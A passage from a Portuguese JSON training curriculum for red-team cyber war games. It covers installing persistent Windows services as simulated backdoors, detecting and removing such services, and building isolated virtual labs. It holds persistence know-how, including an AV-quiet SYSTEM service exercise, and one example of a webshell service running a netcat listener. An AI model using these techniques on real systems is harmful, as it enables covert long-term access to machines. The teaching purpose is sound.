                                    "Esquecer de deletar serviço"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um payload.exe simples em C# que appenda 'Serviço persistente iniciado em [timestamp]' a C:\\temp\\persist.log a cada 60 segundos. Registre com sc create, configure SD para SYSTEM, inicie e confirme log após reboot da VM, simulando uma backdoor em ethical hacking.",
                              "finalVerifications": [
                                "Serviço aparece em services.msc com start=auto e type=own.",
                                "sc sdshow confirma permissões full para SYSTEM (SY).",
                                "sc start inicia sem erros e processo roda em Task Manager.",
                                "Após reboot simulado, sc query mostra STATE=RUNNING.",
                                "Payload produz output esperado (ex: log file atualizado).",
                                "Sem alertas de AV ou erros no Event Viewer."
                              ],
                              "assessmentCriteria": [
                                "Comandos sc executados corretamente sem erros de sintaxe.",
                                "Serviço persiste após simulação de reboot.",
                                "Permissões configuradas adequadamente para SYSTEM.",
                                "Verificações manuais (Task Manager, services.msc) confirmam funcionamento.",
                                "Cleanup realizado (sc delete) para boas práticas.",
                                "Explicação clara dos passos e riscos éticos."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento avançado de serviços Windows.",
                                "Programação: Desenvolvimento de executáveis para serviços (C#, PowerShell).",
                                "Segurança Forense: Detecção de serviços maliciosos via sc query/sdshow.",
                                "Redes e Pivoting: Integração com ferramentas como Metasploit para payloads.",
                                "Ética em Cibersegurança: Uso responsável em Red Team/Blue Team exercises."
                              ],
                              "realWorldApplication": "Em simulações de Red Team e jogos de guerra cibernética, técnicas como essa são usadas para estabelecer persistência em alvos comprometidos, permitindo C2 (Command & Control) de longo prazo, enquanto Blue Teams aprendem a detectar via anomaly hunting em services.msc e logs de eventos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.3.3",
                            "name": "Monitorar e remover serviços persistentes",
                            "description": "Listar serviços com systemctl list-units --type=service (Linux) ou sc query (Windows), verificar logs em journalctl -u persist.service ou Event Viewer, e remover com systemctl disable/remove ou sc delete.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Listar serviços em execução e persistentes",
                                  "subSteps": [
                                    "Prepare um ambiente de laboratório com VMs Linux (Ubuntu) e Windows 10/11.",
                                    "No Linux, execute 'systemctl list-units --type=service --state=running' para listar serviços ativos e 'systemctl list-unit-files --type=service | grep enabled' para persistentes.",
                                    "No Windows, abra PowerShell como admin e execute 'sc query' ou 'Get-Service' para listar todos, e 'Get-Service | Where-Object {$_.StartType -eq \"Automatic\"}' para persistentes.",
                                    "Salve a saída em um arquivo de log para análise: 'systemctl list-units --type=service > services_linux.txt' ou 'sc query > services_win.txt'.",
                                    "Identifique serviços suspeitos por nomes incomuns ou caminhos de executáveis não padrão (ex: /tmp/malware)."
                                  ],
                                  "verification": "Confirme que a lista inclui pelo menos 10 serviços e identifique 2-3 persistentes; compare com lista conhecida de serviços legítimos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VM Linux Ubuntu",
                                    "VM Windows 10/11",
                                    "PowerShell/Terminal como admin"
                                  ],
                                  "tips": "Use grep/findstr para filtrar: 'systemctl list-unit-files | grep -i suspect'. Sempre rode como root/admin.",
                                  "learningObjective": "Dominar comandos para enumerar serviços e diferenciar efêmeros de persistentes.",
                                  "commonMistakes": [
                                    "Executar sem privilégios elevados (falha de permissão)",
                                    "Ignorar serviços masked/disabled",
                                    "Confundir user services com system services"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar logs de serviços suspeitos",
                                  "subSteps": [
                                    "No Linux, para um serviço suspeito 'persist.service', execute 'journalctl -u persist.service -f' para logs em tempo real e 'journalctl -u persist.service --since \"2023-10-01\"' para histórico.",
                                    "No Windows, abra Event Viewer (eventvwr.msc), navegue para Windows Logs > System/Application, filtre por Source=Service Control Manager ou nome do serviço.",
                                    "Analise logs por entradas anormais: IPs desconhecidos, falhas de autenticação, comandos executados em horários suspeitos.",
                                    "Exporte logs relevantes: 'journalctl -u persist.service > logs.txt' ou screenshot/export no Event Viewer.",
                                    "Correlacione com timestamps de infecção conhecida."
                                  ],
                                  "verification": "Identifique pelo menos 3 entradas de log suspeitas e documente evidências de atividade maliciosa.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso ao journalctl/Event Viewer",
                                    "Editor de texto para logs"
                                  ],
                                  "tips": "Use 'journalctl -p err -u service' para erros apenas. No Windows, filtre por Event ID 7000-7009 para falhas de serviço.",
                                  "learningObjective": "Habilidade para extrair e interpretar logs de serviços para detecção de persistência.",
                                  "commonMistakes": [
                                    "Não especificar unidade correta no journalctl",
                                    "Ignorar logs de usuário (journalctl --user)",
                                    "Sobrecarga de logs sem filtros"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desabilitar e remover serviços persistentes",
                                  "subSteps": [
                                    "No Linux, pare o serviço: 'systemctl stop persist.service'; desabilite: 'systemctl disable persist.service'; remova: 'rm /etc/systemd/system/persist.service' e 'systemctl daemon-reload'.",
                                    "No Windows, pare: 'sc stop persist'; delete: 'sc delete persist'; remova arquivos binários manualmente de C:\\Windows\\System32.",
                                    "Verifique dependências: 'systemctl show persist.service -p Requires' ou reg query para Windows.",
                                    "Reinicie o sistema para testar persistência: 'reboot' e reliste serviços.",
                                    "Documente ações em um relatório de remediação."
                                  ],
                                  "verification": "Execute listagem novamente pós-remoção; serviço não deve aparecer como enabled/running.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Privilégios root/admin",
                                    "Backup da VM antes de alterações"
                                  ],
                                  "tips": "Sempre backup config antes de delete. Use 'mask' para serviços recorrentes: 'systemctl mask service'.",
                                  "learningObjective": "Executar remoção segura de serviços maliciosos sem impactar sistema.",
                                  "commonMistakes": [
                                    "Esquecer daemon-reload após rm",
                                    "Deletar serviços críticos como sshd",
                                    "Não parar antes de disable"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar remoção e implementar monitoramento contínuo",
                                  "subSteps": [
                                    "Re-liste serviços pós-reboot e confirme ausência: 'systemctl status persist.service' deve falhar.",
                                    "Configure monitoramento: Crie script bash/PowerShell para alertar novos serviços enabled.",
                                    "Exemplo Linux: 'crontab -e' com '* * * * * systemctl list-unit-files --type=service | grep enabled | mail -s \"New Services\" admin@ex.com'.",
                                    "No Windows: Task Scheduler para rodar Get-Service diariamente.",
                                    "Teste com serviço benigno criado manualmente e remova."
                                  ],
                                  "verification": "Sistema rebootado, serviço ausente, script de monitoramento roda sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de crontab/Task Scheduler",
                                    "Serviço de teste criado"
                                  ],
                                  "tips": "Use tools como OSSEC/AlienVault para automação avançada. Teste em snapshot de VM.",
                                  "learningObjective": "Estabelecer práticas de monitoramento proativo contra reinfecções.",
                                  "commonMistakes": [
                                    "Não rebootar para validar",
                                    "Scripts sem notificações",
                                    "Permissões erradas no cron"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um pentest, detecte 'webshell.service' (Linux) iniciando nc -lvp 4444. Liste com systemctl, cheque journalctl por conexões outbound, stop/disable/rm o serviço, reboot e confirme ausência, prevenindo C2 persistente.",
                              "finalVerifications": [
                                "Lista completa de serviços gerada sem erros em ambos OS.",
                                "Logs suspeitos identificados e analisados corretamente.",
                                "Serviço removido com sucesso e ausente pós-reboot.",
                                "Script de monitoramento implementado e testado.",
                                "Relatório documentado com comandos e saídas.",
                                "Nenhum impacto em serviços legítimos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de comandos (sem erros de sintaxe).",
                                "Identificação correta de serviços/logs suspeitos (80% acurácia).",
                                "Tempo total dentro de 2 horas.",
                                "Documentação completa com screenshots/saídas.",
                                "Compreensão demonstrada em quiz pós-atividade.",
                                "Aplicação segura sem danos ao ambiente."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de init/systemd.",
                                "Análise Forense Digital: Interpretação de logs e evidências.",
                                "Scripting/Automação: Criação de scripts de monitoramento em Bash/PowerShell.",
                                "Redes e Segurança: Detecção de C2 via persistência de serviços.",
                                "Resposta a Incidentes: Procedimentos de remediação."
                              ],
                              "realWorldApplication": "Em resposta a incidentes de segurança, como em servidores AWS/EC2 comprometidos por ransomware, profissionais de SOC usam essas técnicas para detectar backdoors persistentes, removê-los rapidamente e restaurar operações sem downtime prolongado."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.7",
                "name": "Montagem de Ambientes de Jogos Cibernéticos para Red Team",
                "description": "Orienta a configuração de laboratórios virtuais para exercícios de guerra cibernética na perspectiva de ataque.",
                "totalSkills": 51,
                "atomicTopics": [
                  {
                    "id": "10.1.7.1",
                    "name": "Seleção de Plataformas de Virtualização",
                    "description": "Escolha e instalação de hypervisors como VMware, VirtualBox ou KVM para suportar laboratórios isolados.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.1.1.1",
                        "name": "Fundamentos de Hypervisors para Labs Isolados",
                        "description": "Compreensão dos tipos de hypervisors (Tipo 1 e Tipo 2), critérios de seleção baseados em isolamento de rede, desempenho, compatibilidade com ferramentas de Red Team e suporte a snapshots para cenários de jogos cibernéticos.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.1.1.1.1",
                            "name": "Identificar Tipos de Hypervisors",
                            "description": "Diferenciar hypervisors Tipo 1 (bare-metal, como KVM e ESXi) de Tipo 2 (hosted, como VMware Workstation e VirtualBox), avaliando vantagens em isolamento e overhead para ambientes de simulação de ataques cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Fundamental de Hypervisors",
                                  "subSteps": [
                                    "Defina hypervisor como software que cria e gerencia máquinas virtuais (VMs).",
                                    "Explique a função principal: abstrair hardware físico para múltiplas VMs.",
                                    "Identifique a importância em ambientes de segurança cibernética para isolamento.",
                                    "Pesquise a evolução histórica breve (de mainframes a cloud).",
                                    "Anote definições chave em um documento pessoal."
                                  ],
                                  "verification": "Resuma em 3-5 frases o que é um hypervisor e sua relevância para labs isolados.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notebook ou computador",
                                    "Acesso à internet para leitura (Wikipedia: Hypervisor, VMware docs)"
                                  ],
                                  "tips": "Use analogias como 'hypervisor é o maestro da orquestra de VMs' para fixar o conceito.",
                                  "learningObjective": "Entender o papel básico dos hypervisors na virtualização.",
                                  "commonMistakes": [
                                    "Confundir hypervisor com container (ex: Docker)",
                                    "Ignorar contexto de isolamento em segurança"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Hypervisors Tipo 1 (Bare-Metal)",
                                  "subSteps": [
                                    "Descreva Tipo 1: Instalado diretamente no hardware (sem SO host).",
                                    "Liste exemplos: KVM (Linux), VMware ESXi, Microsoft Hyper-V, Xen.",
                                    "Analise vantagens: Maior isolamento, menor overhead de performance.",
                                    "Pesquise arquitetura: Rodam no ring 0 do hardware.",
                                    "Instale um demo simples como KVM em uma VM de teste (se possível)."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando Tipo 1 entre hardware e VMs.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel/caneta para diagrama",
                                    "Documentação oficial KVM/ESXi (PDFs online)",
                                    "Máquina virtual para teste KVM"
                                  ],
                                  "tips": "Compare com 'casa própria' vs 'aluguel': Tipo 1 é direto no hardware.",
                                  "learningObjective": "Identificar características e benefícios do Tipo 1 para simulações seguras.",
                                  "commonMistakes": [
                                    "Achar que ESXi precisa de Windows host",
                                    "Subestimar requisitos de hardware dedicados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Hypervisors Tipo 2 (Hosted)",
                                  "subSteps": [
                                    "Descreva Tipo 2: Rodam sobre um SO host existente.",
                                    "Liste exemplos: VMware Workstation, VirtualBox, Parallels.",
                                    "Discuta desvantagens: Overhead maior, isolamento inferior (depende do host).",
                                    "Pesquise arquitetura: SO host + hypervisor em ring 3.",
                                    "Execute uma VM simples no VirtualBox para observar overhead."
                                  ],
                                  "verification": "Meça e registre tempo de boot de uma VM no VirtualBox vs. expectativa em Tipo 1.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "VirtualBox instalado",
                                    "Máquina host com SO Windows/Linux",
                                    "Ferramenta de monitoramento como Task Manager/Htop"
                                  ],
                                  "tips": "Monitore CPU/RAM para visualizar overhead real.",
                                  "learningObjective": "Reconhecer limitações do Tipo 2 em cenários de alta segurança.",
                                  "commonMistakes": [
                                    "Confundir hosted com bare-metal",
                                    "Ignorar vulnerabilidades propagadas do host"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar Tipos e Avaliar para Simulação de Ataques Cibernéticos",
                                  "subSteps": [
                                    "Crie tabela comparativa: Isolamento, Overhead, Usos em Red Team.",
                                    "Avalie Tipo 1: Ideal para labs isolados (ex: ataques sem vazamento).",
                                    "Avalie Tipo 2: Bom para simulações leves/protótipos rápidos.",
                                    "Discuta trade-offs: Custo hardware vs. facilidade de setup.",
                                    "Simule escolha: Para jogo de guerra, prefira Tipo 1."
                                  ],
                                  "verification": "Escreva parágrafo justificando escolha de hypervisor para um lab de ataque simulado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Planilha Google Sheets/Excel para tabela",
                                    "Artigos sobre virtualização em cibersegurança (ex: SANS Institute)"
                                  ],
                                  "tips": "Priorize isolamento em cenários Red Team: 'Melhor prevenir vazamento que remediar'.",
                                  "learningObjective": "Diferenciar e selecionar hypervisors baseado em contexto de segurança.",
                                  "commonMistakes": [
                                    "Generalizar Tipo 2 como inadequado sem contexto",
                                    "Esquecer custo-benefício"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, use ESXi (Tipo 1) para isolar VMs de vítima/atacante, simulando phishing sem risco ao host real; compare com VirtualBox (Tipo 2) onde um malware poderia escapar para o SO host.",
                              "finalVerifications": [
                                "Explique diferença entre Tipo 1 e 2 em <1 minuto.",
                                "Liste 3 exemplos de cada tipo corretamente.",
                                "Descreva por que Tipo 1 é preferido em simulações de ataques.",
                                "Crie diagrama comparativo.",
                                "Justifique escolha para um cenário hipotético de jogo cibernético.",
                                "Meça overhead em demo prático."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e exemplos (90% correto).",
                                "Compreensão de isolamento/overhead com evidências práticas.",
                                "Aplicação contextual a segurança cibernética.",
                                "Tabela/diagrama claro e completo.",
                                "Identificação correta de trade-offs.",
                                "Justificativa lógica para seleção em labs."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender rings de privilégio.",
                                "Redes: Configuração de redes virtuais isoladas.",
                                "Segurança da Informação: Conceitos de sandboxing.",
                                "Cloud Computing: Hypervisors em AWS/Azure.",
                                "Desenvolvimento de Software: VMs para CI/CD seguras."
                              ],
                              "realWorldApplication": "Em operações de Red Team, hypervisors Tipo 1 como KVM/ESXi criam labs isolados para simular ataques reais (ex: ransomware), evitando contaminação de redes corporativas e permitindo análise forense segura."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.1.1.2",
                            "name": "Definir Critérios de Seleção",
                            "description": "Estabelecer critérios como requisitos de hardware (CPU com virtualização), suporte a redes isoladas (NAT, Host-Only), portabilidade de VMs e integração com ferramentas como Metasploit para labs de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Requisitos Funcionais Essenciais para Labs de Red Team",
                                  "subSteps": [
                                    "Analise o escopo do lab: simular ataques de rede, exploits e persistência em ambientes isolados.",
                                    "Liste necessidades básicas: criação rápida de VMs, snapshots para rollback e suporte a múltiplos SOs vulneráveis.",
                                    "Priorize isolamento total para evitar vazamentos para a rede host.",
                                    "Considere escalabilidade para 5-10 VMs simultâneas em jogos de guerra cibernética.",
                                    "Documente em uma tabela inicial: funcionalidade vs. impacto no Red Team."
                                  ],
                                  "verification": "Verifique se a lista cobre pelo menos 5 requisitos chave documentados em um documento compartilhável.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Notebook, planilha Google Sheets ou Excel, documentação de hypervisors (VirtualBox, VMware, KVM).",
                                  "tips": "Comece pelo fim: pense no que falha em labs reais, como contaminação de host.",
                                  "learningObjective": "Compreender os requisitos funcionais que garantem segurança e eficiência em simulações de ataque.",
                                  "commonMistakes": "Ignorar snapshots, levando a downtime excessivo após exploits."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Critérios de Hardware e Suporte a Virtualização",
                                  "subSteps": [
                                    "Verifique suporte a VT-x/AMD-V na CPU do host usando ferramentas como CPU-Z.",
                                    "Especifique mínimo: 8GB RAM alocável, SSD para I/O rápido em VMs.",
                                    "Exija aceleração de hardware para performance em cenários de alta carga (ex: fuzzing).",
                                    "Teste compatibilidade com GPUs pass-through para simulações gráficas de malware.",
                                    "Inclua critérios de portabilidade: exportação OVF/OVA para migração entre hosts."
                                  ],
                                  "verification": "Execute um benchmark simples de CPU virtualização e confirme specs em relatório.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "CPU-Z ou lscpu (Linux), specs de hypervisors oficiais, calculadora de recursos.",
                                  "tips": "Use 'kvm-ok' no Linux para check rápido de virtualização.",
                                  "learningObjective": "Estabelecer critérios que garantam performance estável sem comprometer o hardware host.",
                                  "commonMistakes": "Subestimar RAM, causando thrashing em múltiplas VMs ativas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Especificar Suporte a Redes Isoladas e Integrações",
                                  "subSteps": [
                                    "Defina modos de rede: NAT para internet simulada, Host-Only para LAN isolada, Internal para air-gapped.",
                                    "Exija bridged opcional com firewall rules para simular perimeter defense.",
                                    "Verifique integração nativa ou via plugins com Metasploit, Wireshark e ferramentas de Red Team.",
                                    "Teste configuração de VLANs virtuais para segmentação em cenários avançados.",
                                    "Documente limitações: throughput de rede >1Gbps para ataques de flood."
                                  ],
                                  "verification": "Configure uma rede teste com 2 VMs e capture tráfego isolado sem vazamento.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Hypervisor instalado (ex: VirtualBox), Metasploit Community, Wireshark.",
                                  "tips": "Sempre teste com nmap scans para validar isolamento antes de prosseguir.",
                                  "learningObjective": "Garantir que critérios suportem redes realistas para operações cibernéticas sem riscos reais.",
                                  "commonMistakes": "Confundir NAT com bridged, expondo host acidentalmente."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compilar, Priorizar e Documentar Critérios Finais",
                                  "subSteps": [
                                    "Pontue critérios: essencial (must-have), desejável (nice-to-have), usando matriz de decisão.",
                                    "Compare hypervisors candidatos (VirtualBox, VMware Workstation, KVM/QEMU) contra critérios.",
                                    "Inclua métricas quantificáveis: tempo de boot VM <30s, overhead CPU <10%.",
                                    "Crie template reutilizável para futuras seleções em labs.",
                                    "Revise com pares para validação."
                                  ],
                                  "verification": "Gere documento final com tabela priorizada e scores para 3 hypervisors.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Matriz de decisão em Markdown ou Excel, lista de hypervisors.",
                                  "tips": "Use MoSCoW method (Must, Should, Could, Won't) para priorização clara.",
                                  "learningObjective": "Produzir um framework decisório robusto e reutilizável para seleções de hypervisors.",
                                  "commonMistakes": "Sobrecarregar com critérios irrelevantes, paralisando a decisão."
                                }
                              ],
                              "practicalExample": "Para um lab de Red Team simulando APT em rede corporativa: critérios priorizam KVM por suporte nativo a nested virtualization (VMs dentro de VMs para C2), NAT/Host-Only sem overhead VMware, e scripts de automação para deploy de 8 VMs vulneráveis (Windows XP, Metasploitable) integradas ao Metasploit.",
                              "finalVerifications": [
                                "Lista inclui CPU com virtualização habilitada e mínimo 16GB RAM host.",
                                "Suporte explícito a NAT, Host-Only e Internal networks documentado.",
                                "Critérios de portabilidade (OVF export) e snapshots testados.",
                                "Integração com Metasploit confirmada via plugin ou API.",
                                "Matriz de priorização cobre 3+ hypervisors com scores.",
                                "Documentação identifica riscos de performance e mitigações."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos critérios funcionais, hardware e rede cobertos (peso 30%).",
                                "Precisão técnica: Specs alinhadas a docs oficiais de hypervisors (25%).",
                                "Priorização lógica: Uso de matriz com MoSCoW ou scoring (20%).",
                                "Praticidade: Exemplos testáveis e tempos realistas (15%).",
                                "Documentação clara: Tabelas, templates reutilizáveis (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Configurações NAT/Bridged e VLANs virtuais.",
                                "Arquitetura de Hardware: Virtualização assistida por hardware (VT-x).",
                                "Programação de Scripts: Automação de deploy VMs via Vagrant/Ansible.",
                                "Gestão de Projetos: Matrizes de decisão e priorização de requisitos."
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais, como pentests contratados, esses critérios garantem labs isolados que simulam breaches reais (ex: Colonial Pipeline simulação), permitindo testes de Metasploit em VMs sem risco ao cliente, com migração rápida para clouds híbridas como AWS Outposts."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.1.1.3",
                            "name": "Avaliar Riscos de Isolamento",
                            "description": "Analisar configurações de segurança para prevenir vazamentos entre VMs e host, incluindo desativação de compartilhamento de pastas e uso de firewalls virtuais em contextos de operações ofensivas cibernéticas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os riscos de isolamento em hypervisors",
                                  "subSteps": [
                                    "Estudar ataques conhecidos como CVE-2015-3456 (Venom) e vazamentos via hypervisor.",
                                    "Identificar vetores comuns: compartilhamento de pastas, clipboard, drag-and-drop e rede bridged.",
                                    "Analisar diferenças entre Type 1 e Type 2 hypervisors em termos de isolamento.",
                                    "Mapear impactos em operações ofensivas: contaminação de host ou detecção precoce.",
                                    "Revisar documentação oficial do hypervisor (ex: VMware, VirtualBox)."
                                  ],
                                  "verification": "Criar um mapa mental ou tabela com pelo menos 5 riscos identificados e suas mitigações.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação VMware/VirtualBox",
                                    "Artigos sobre CVEs de hypervisors",
                                    "Ferramenta de mind mapping como XMind"
                                  ],
                                  "tips": "Priorize riscos relevantes para Red Team, focando em cenários ofensivos.",
                                  "learningObjective": "Identificar e classificar riscos de vazamento entre VMs e host.",
                                  "commonMistakes": [
                                    "Subestimar riscos de rede bridged",
                                    "Ignorar clipboard sharing",
                                    "Confundir isolamento de VMs com isolamento de host"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar e desativar compartilhamentos desnecessários",
                                  "subSteps": [
                                    "Acessar configurações de VM e desativar 'Shared Folders'.",
                                    "Desabilitar 'Drag and Drop' e 'Copy/Paste' (clipboard sharing).",
                                    "Configurar rede como 'Host-Only' ou 'NAT' em vez de 'Bridged'.",
                                    "Verificar configurações de USB passthrough e dispositivos compartilhados.",
                                    "Reiniciar VM e testar acesso não autorizado ao host."
                                  ],
                                  "verification": "Executar comandos como 'net use' na VM para confirmar ausência de shares.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Hypervisor instalado (VMware/VirtualBox)",
                                    "VM de teste com SO Windows/Linux",
                                    "Checklists de configuração"
                                  ],
                                  "tips": "Documente todas as mudanças em um log para auditoria posterior.",
                                  "learningObjective": "Configurar VMs sem vetores de compartilhamento ativo.",
                                  "commonMistakes": [
                                    "Esquecer de desativar em todas as VMs do lab",
                                    "Usar bridged sem firewall",
                                    "Não reiniciar após mudanças"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar firewalls virtuais para isolamento reforçado",
                                  "subSteps": [
                                    "Instalar e configurar firewall no host (ex: Windows Firewall, UFW no Linux).",
                                    "Criar regras para bloquear tráfego entre host e VMs exceto portas essenciais.",
                                    "Configurar firewall dentro das VMs para bloquear saída para host.",
                                    "Habilitar host firewall no hypervisor (ex: VMware Host Firewall).",
                                    "Testar conectividade com ferramentas como nmap."
                                  ],
                                  "verification": "Scan de rede com nmap confirma zero portas abertas entre VM e host.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Nmap",
                                    "Ferramentas de firewall (ufw, firewalld)",
                                    "Hypervisor com VMs ativas"
                                  ],
                                  "tips": "Use regras deny-all como base e allow apenas o necessário.",
                                  "learningObjective": "Implementar camadas de firewall para prevenir vazamentos laterais.",
                                  "commonMistakes": [
                                    "Regras muito permissivas",
                                    "Esquecer firewall na VM vítima",
                                    "Não testar após configuração"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e validar o isolamento do ambiente",
                                  "subSteps": [
                                    "Executar scans de vulnerabilidade (ex: OpenVAS) da VM para host.",
                                    "Simular ataques: tentar escapes via shared resources ou rede.",
                                    "Monitorar logs do hypervisor e host por acessos suspeitos.",
                                    "Usar ferramentas como Wireshark para capturar tráfego inter-VM/host.",
                                    "Documentar resultados e propor melhorias adicionais."
                                  ],
                                  "verification": "Relatório de teste sem vazamentos detectados; todas verificações passam.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Nmap, Wireshark, Metasploit (lite)",
                                    "OpenVAS",
                                    "Logs do hypervisor"
                                  ],
                                  "tips": "Simule cenários reais de Red Team para relevância.",
                                  "learningObjective": "Validar efetividade das medidas de isolamento via testes práticos.",
                                  "commonMistakes": [
                                    "Testes superficiais sem payloads reais",
                                    "Ignorar monitoramento de logs",
                                    "Não isolar lab da rede real"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team com VMware: Crie 3 VMs (atacante Kali, vítima Windows, defensor host). Desative shared folders e clipboard, configure firewalls para bloquear portas 445/SMB e 3389/RDP. Teste com nmap da VM atacante para host: sem respostas. Simule exploit SMB na vítima sem propagar ao host.",
                              "finalVerifications": [
                                "Nenhum compartilhamento ativo entre VMs e host.",
                                "Firewalls bloqueiam todo tráfego não essencial.",
                                "Testes de nmap/Wireshark mostram isolamento completo.",
                                "Logs limpos sem acessos suspeitos.",
                                "Documentação de configurações e testes salva.",
                                "Ambiente pronto para simulação ofensiva sem riscos de vazamento."
                              ],
                              "assessmentCriteria": [
                                "Identificação precisa de pelo menos 5 riscos de isolamento.",
                                "Configurações de compartilhamento desativadas corretamente em todas VMs.",
                                "Regras de firewall implementadas e testadas com sucesso.",
                                "Relatório de testes inclui evidências (screenshots/logs).",
                                "Tempo total dentro do estimado com qualidade alta.",
                                "Conexão clara com contexto de Red Team."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Configuração de NAT/Host-Only e análise de tráfego.",
                                "Sistemas Operacionais: Gerenciamento de firewalls e logs.",
                                "Ética e Conformidade: Prevenção de vazamentos em simulações.",
                                "Programação: Scripts para automação de testes (Bash/Python)."
                              ],
                              "realWorldApplication": "Em operações de Red Team corporativas, garante que labs de jogos cibernéticos não comprometam a infraestrutura de produção, evitando detecção precoce ou contaminação do host durante simulações de ataques avançados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.1.1.2",
                        "name": "VMware como Plataforma de Virtualização",
                        "description": "Exploração do ecossistema VMware (Workstation, Player, ESXi) para criação de laboratórios isolados, com foco em instalação e configuração para suportar pivoting e persistência em jogos cibernéticos.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.1.1.2.1",
                            "name": "Baixar e Instalar VMware Workstation",
                            "description": "Realizar download da versão trial ou gratuita do VMware Workstation Pro/Fusion, verificar compatibilidade com hardware VT-x/AMD-V e executar instalação em hosts Windows/Linux para labs de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar Compatibilidade do Hardware e Sistema",
                                  "subSteps": [
                                    "Acesse as configurações da BIOS/UEFI pressionando a tecla apropriada (ex: Del, F2) durante o boot.",
                                    "Localize a seção de CPU ou Advanced e habilite Virtualização Technology (VT-x para Intel ou AMD-V para AMD).",
                                    "Salve as alterações e reinicie o computador.",
                                    "Execute o utilitário de diagnóstico da CPU (como CPU-Z ou Intel Processor Identification Utility) para confirmar suporte a VT-x/AMD-V.",
                                    "Verifique requisitos mínimos: Windows 10/11 ou Linux compatível, pelo menos 8GB RAM, 2GHz CPU dual-core."
                                  ],
                                  "verification": "Confirme via relatório do utilitário que VT-x/AMD-V está ativado e requisitos atendidos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Computador host, acesso à BIOS, CPU-Z ou similar (gratuito)",
                                  "tips": "Faça backup de dados importantes antes de alterar BIOS.",
                                  "learningObjective": "Identificar e ativar suporte de virtualização no hardware para ambientes de lab seguros.",
                                  "commonMistakes": "Esquecer de salvar alterações na BIOS ou confundir VT-x com outros recursos como Hyper-V."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Baixar a Versão Trial ou Gratuita do VMware Workstation",
                                  "subSteps": [
                                    "Acesse o site oficial da Broadcom/VMware (vmware.com/products/workstation-pro.html).",
                                    "Selecione VMware Workstation Pro para Windows/Linux ou Fusion para macOS.",
                                    "Escolha a opção de trial de 30 dias ou versão player gratuita se aplicável.",
                                    "Faça login ou crie uma conta gratuita para download.",
                                    "Baixe o instalador (.exe para Windows ou .bundle para Linux) e verifique o hash SHA256 no site para integridade."
                                  ],
                                  "verification": "Arquivo baixado com tamanho e hash correspondentes aos listados no site oficial.",
                                  "estimatedTime": "10 minutos",
